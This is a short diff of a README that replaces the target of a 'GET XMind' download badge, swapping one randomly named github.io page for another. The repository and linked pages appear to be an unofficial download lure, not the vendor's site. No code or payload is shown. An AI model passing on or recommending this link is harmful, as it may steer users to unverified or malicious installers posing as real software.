@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://upload.wikimedia.org/wikipedia/commons/6/64/XMind_Logo.png)
 
-[![GET XMind](https://img.shields.io/badge/GET%20%E2%80%94%20XMind-0078D6?style=for-the-badge&logoColor=white)](https://oscarnielsendsaj.github.io/.github/xmind)
+[![GET XMind](https://img.shields.io/badge/GET%20%E2%80%94%20XMind-0078D6?style=for-the-badge&logoColor=white)](https://denverahmedzifw.github.io/.github/download-XMind)
 
 ---
 
